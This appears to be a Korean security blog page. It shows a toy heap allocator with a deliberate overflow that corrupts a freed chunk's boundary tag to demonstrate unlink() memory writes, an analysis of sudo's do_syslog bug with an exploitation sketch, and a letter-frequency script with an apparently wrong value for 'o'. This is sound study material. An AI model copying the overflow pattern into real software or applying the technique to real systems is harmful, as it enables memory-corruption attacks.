</span><span class='line'>    <span class="n">alloc_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">((</span><span class="n">p</span><span class="o">=</span><span class="n">find_first_fit</span><span class="p">(</span><span class="n">alloc_size</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">_top</span><span class="o">+</span><span class="n">alloc_size</span> <span class="o">&gt;=</span> <span class="n">_end</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;kcmalloc failed.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">p</span> <span class="o">=</span> <span class="n">_top</span><span class="p">;</span>
</span><span class='line'>        <span class="n">_top</span> <span class="o">+=</span> <span class="n">alloc_size</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;kcmalloc: c %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span><span class='line'>        <span class="n">p</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;kcmalloc: p %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">c</span><span class="o">-&gt;</span><span class="n">in_use</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="n">c</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">alloc_size</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'>        <span class="n">p</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
</span><span class='line'>        <span class="n">c</span><span class="o">-&gt;</span><span class="n">in_use</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">dump_list</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">head</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span><span class="n">thru</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">thru</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="o">*</span><span class="p">)</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;dump free_list</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="n">thru</span> <span class="o">!=</span> <span class="n">head</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;free_list -&gt; %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">thru</span><span class="p">);</span>
</span><span class='line'>        <span class="n">thru</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="o">*</span><span class="p">)</span><span class="n">thru</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">kcfree</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">mem</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">mem2chunk</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>
</span><span class='line'>    <span class="n">c</span><span class="o">-&gt;</span><span class="n">in_use</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">add_list</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_free</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">kcinit</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="n">kcmalloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span> <span class="cm">/* &lt;- [1] */</span>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="n">kcmalloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>  <span class="cm">/* &lt;- [2] */</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="s">&quot;babo&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&quot;babo2&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">kcfree</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>          <span class="cm">/* &lt;- [3] */</span>
</span><span class='line'>    <span class="n">dump_list</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_free</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="n">kcmalloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span> <span class="cm">/* &lt;- [4] */</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">kcfree</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>          <span class="cm">/* &lt;- [5] */</span>
</span><span class='line'>    <span class="n">dump_list</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_free</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이걸 실행시키면</p>

<figure class='code'><figcaption><span>kcmalloc.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">%</span> <span class="p">.</span><span class="o">/</span><span class="n">m</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">c</span> <span class="mf">7f</span><span class="mi">6000</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">p</span> <span class="mf">7f</span><span class="mi">6020</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">c</span> <span class="mf">7f</span><span class="mi">6420</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">p</span> <span class="mf">7f</span><span class="mi">6440</span>
</span><span class='line'><span class="n">babo</span>
</span><span class='line'><span class="n">babo2</span>
</span><span class='line'><span class="n">dump</span> <span class="n">free_list</span>
</span><span class='line'><span class="n">free_list</span> <span class="o">-&gt;</span> <span class="mf">7f</span><span class="mi">6000</span>
</span><span class='line'><span class="n">babo</span>
</span><span class='line'><span class="n">dump</span> <span class="n">free_list</span>
</span><span class='line'><span class="n">dump</span> <span class="n">free_list</span>
</span><span class='line'><span class="n">free_list</span> <span class="o">-&gt;</span> <span class="mf">7f</span><span class="mi">6420</span>
</span><span class='line'><span class="o">%</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>[3]</code> 에서 <code>a</code> 에 alloc 되었던 chunk 가 free list 로 들어간다. 그리고 <code>[4]</code> 에서 1000 을 alloc 하면 free list 에서 가져오게 된다. chunk 가 reuse 되니까 <code>puts()</code> 에서 동일하게 <code>babo</code> 가 출력된다. free list 에서 chunk 를 떼어내면서 <code>unlink()</code> 가 들어가게 된다.</p>

<p>만약 프로그램 순서가 <code>kcfree(b)</code> -> <code>kcmalloc(100)</code> 으로 가고, 그 사이에서 <code>a</code> 를 이용해 <code>b</code> 의 바운더리태그의 <code>fd</code>, <code>bk</code> 를 조작할 수 있다면 <code>kcmalloc(100)</code> 할 때 <code>unlink()</code> 에서 memory write 가 가능해진다.</p>

<p>그럼 프로그램을 조금 바꿔보자.</p>

<figure class='code'><figcaption><span>kcmalloc.c </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">kcinit</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="n">kcmalloc</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span> <span class="cm">/* &lt;- [1] */</span>
</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="n">kcmalloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>  <span class="cm">/* &lt;- [2] */</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="s">&quot;babo&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&quot;babo2&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">kcfree</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>          <span class="cm">/* &lt;- [3] */</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memset</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mi">512</span><span class="o">+</span><span class="mi">32</span><span class="p">);</span>  <span class="cm">/* &lt;- [6] */</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">a</span> <span class="o">=</span> <span class="n">kcmalloc</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span> <span class="cm">/* &lt;- [4] */</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">kcfree</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>          <span class="cm">/* &lt;- [5] */</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>이제 a 뒤에 위치한 b 를 free 해서 b 를 linked list 에 집어 넣는다[3]. 그래야 unlink() 로 떼어낼 수 있을테니. 그리고 a 에 alloc 된 메모리를 쭈욱 밀어서 b 앞에 위치한 boundary tag 를 오염시킨다[6]. 그리고 kcmalloc() 에 들어간다[4]. free chunk 에서 알맞은 청크를 찾았다. 그래서 list 에서 unlink() 로 떼어날때 메모리 에러가 난다.</p>

<figure class='code'><figcaption><span>kcmalloc.c </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">%</span> <span class="p">.</span><span class="o">/</span><span class="n">m</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">c</span> <span class="mi">1</span><span class="n">d00000</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">p</span> <span class="mi">1</span><span class="n">d00020</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">c</span> <span class="mi">1</span><span class="n">d00220</span>
</span><span class='line'><span class="nl">kcmalloc</span><span class="p">:</span> <span class="n">p</span> <span class="mi">1</span><span class="n">d00240</span>
</span><span class='line'><span class="n">babo</span>
</span><span class='line'><span class="n">babo2</span>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="o">%</span>
</span></code></pre></td></tr></table></div></figure>


<p>이런식으로 memory write 를 하는 것이 heap overflow 의 기초.</p>

<figure class='code'><figcaption><span>unlink()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define unlink(P,BK,FD) {\</span>
</span><span class='line'><span class="cp">    BK = P-&gt;bk; \</span>
</span><span class='line'><span class="cp">    FD = P-&gt;fd; \</span>
</span><span class='line'><span class="cp">    FD-&gt;bk = BK; \</span>
</span><span class='line'><span class="cp">    BK-&gt;fd = FD; \</span>
</span><span class='line'><span class="cp">    }</span>
</span></code></pre></td></tr></table></div></figure>


<p>이제 본격적으로 dlmalloc 을 뒤져봐야겠다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/22/vudo/">Vudo</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-22T21:00:28+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>9:00 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><figure class='code'><figcaption><span>do_syslog</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Log a message to syslog, pre-pending the username and splitting the</span>
</span><span class='line'><span class="cm"> * message into parts if it is longer than MAXSYSLOGLEN</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">do_syslog</span><span class="p">(</span><span class="kt">int</span> <span class="n">pri</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span> <span class="n">p</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span> <span class="n">tmp</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">save</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* </span>
</span><span class='line'><span class="cm">     * Log the full line, breaking into multiple syslog(3) calls if</span>
</span><span class='line'><span class="cm">     * necessary</span>
</span><span class='line'><span class="cm">     */</span>
</span><span class='line'><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">msg</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="o">/</span><span class="n">MAXSYSLOGLEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="p">[</span><span class="mi">2</span><span class="p">]</span>     <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">MAXSYSLOGLEN</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="cm">/*</span>
</span><span class='line'><span class="cm">             * Break up the line into what will fit on one syslog(3) line</span>
</span><span class='line'><span class="cm">             * Try to break on a word boundary if possible.</span>
</span><span class='line'><span class="cm">             */</span>
</span><span class='line'><span class="p">[</span><span class="mi">3</span><span class="p">]</span>         <span class="k">for</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="n">MAXSYSLOGLEN</span><span class="p">;</span> <span class="n">tmp</span> <span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">!=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span> <span class="n">tmp</span><span class="o">--</span><span class="p">)</span>
</span><span class='line'>                <span class="p">;</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&lt;=</span> <span class="n">p</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="mi">4</span><span class="p">]</span>             <span class="n">tmp</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="n">MAXSYSLOGLEN</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="cm">/* NULL terminate line, but save the char to restore later */</span>
</span><span class='line'>            <span class="n">save</span> <span class="o">=</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
</span><span class='line'><span class="p">[</span><span class="mi">5</span><span class="p">]</span>         <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">SYSLOG</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">&quot;%8.8s : %s&quot;</span><span class="p">,</span> <span class="n">user_name</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'>            <span class="k">else</span>
</span><span class='line'>                <span class="n">SYSLOG</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">&quot;%8.8s : (command continuted) %s&quot;</span><span class="p">,</span> <span class="n">user_name</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="cm">/* restore saved character */</span>
</span><span class='line'><span class="p">[</span><span class="mi">6</span><span class="p">]</span>         <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">save</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="cm">/* Eliminate leading whitespace */</span>
</span><span class='line'><span class="p">[</span><span class="mi">7</span><span class="p">]</span>         <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>                <span class="p">;</span>
</span><span class='line'><span class="p">[</span><span class="mi">8</span><span class="p">]</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">SYSLOG</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">&quot;%8.8s : %s&quot;</span><span class="p">,</span> <span class="n">user_name</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'>            <span class="k">else</span>
</span><span class='line'>                <span class="n">SYSLOG</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">&quot;%8.8s : (command continued) %s&quot;</span><span class="p">,</span> <span class="n">user_name</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>[7] 에서 NULL check 를 하지 않아서, 포인터가 엄청 전진할 수 있다. 전진하다가 mapping 안된 메모리까지 가서 segmentation fault 11 로 죽는다.</p>

<p>이걸 익스플로잇하려면 memory write operation 인 [5] 나 [6] 에서 해야할텐데.</p>

<p>[5] 에서 잘못된 곳에 NULL 이 들어가고 syslog() 에 들어가서 syslog() 가 부른 malloc()/free() 에 의해 뭔가가 일어나는 시나리오가 필요하다.</p>

<p>일단 [7] 에서 alloc 된 메모리 밖으로 밀고 나갔다가, <code>' '</code> 을 발견하고 for() 가 끊기고, 루프 위로 올라가는 시나리오.</p>

<p>다시 루프 위로 올라가서 [5] 에서 NULL byte 커럽션이 일어나고 <code>SYSLOG()</code> 로 들어가서 <code>malloc()</code> 이 일어나면서 memory write 가 트리거되는 구조.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/17/average-letter-frequencies-for-english-language-text/">Average Letter Frequencies for English-Language Text</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-17T09:43:11+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:43 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">table</span> <span class="o">=</span> <span class="p">{</span>   <span class="s">&#39;a&#39;</span><span class="p">:</span> <span class="mf">8.2</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">:</span> <span class="mf">1.5</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="mf">2.8</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="mf">4.3</span><span class="p">,</span> <span class="s">&#39;e&#39;</span><span class="p">:</span> <span class="mf">12.7</span><span class="p">,</span> <span class="s">&#39;f&#39;</span><span class="p">:</span> <span class="mf">2.2</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="mf">2.0</span><span class="p">,</span> <span class="s">&#39;h&#39;</span><span class="p">:</span> <span class="mf">6.1</span><span class="p">,</span> <span class="s">&#39;i&#39;</span><span class="p">:</span> <span class="mf">7.0</span><span class="p">,</span> <span class="s">&#39;j&#39;</span><span class="p">:</span> <span class="mf">0.2</span><span class="p">,</span> <span class="s">&#39;k&#39;</span><span class="p">:</span> <span class="mf">0.8</span><span class="p">,</span> <span class="s">&#39;l&#39;</span><span class="p">:</span> <span class="mf">4.0</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;m&#39;</span><span class="p">:</span> <span class="mf">2.4</span><span class="p">,</span> <span class="s">&#39;n&#39;</span><span class="p">:</span> <span class="mf">6.7</span><span class="p">,</span> <span class="s">&#39;o&#39;</span><span class="p">:</span> <span class="mf">1.5</span><span class="p">,</span> <span class="s">&#39;p&#39;</span><span class="p">:</span> <span class="mf">1.9</span><span class="p">,</span> <span class="s">&#39;q&#39;</span><span class="p">:</span> <span class="mf">0.1</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">:</span> <span class="mf">6.0</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;s&#39;</span><span class="p">:</span> <span class="mf">6.3</span><span class="p">,</span> <span class="s">&#39;t&#39;</span><span class="p">:</span> <span class="mf">9.1</span><span class="p">,</span> <span class="s">&#39;u&#39;</span><span class="p">:</span> <span class="mf">2.8</span><span class="p">,</span> <span class="s">&#39;v&#39;</span><span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">:</span> <span class="mf">2.4</span><span class="p">,</span> <span class="s">&#39;x&#39;</span><span class="p">:</span> <span class="mf">0.2</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;y&#39;</span><span class="p">:</span> <span class="mf">2.0</span><span class="p">,</span> <span class="s">&#39;z&#39;</span><span class="p">:</span> <span class="mf">0.1</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sq</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">table</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span>
</span><span class='line'>        <span class="n">sq</span> <span class="o">+=</span> <span class="n">f</span><span class="o">*</span><span class="n">f</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">sq</span>
</span></code></pre></td></tr></table></div></figure>


<p>돌리면 <code>0.060251</code> 이 나온다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/16/ms15-034-http-dot-sys/">MS15-034 HTTP.sys</a></h1>
    
    
      <p class="meta">
        




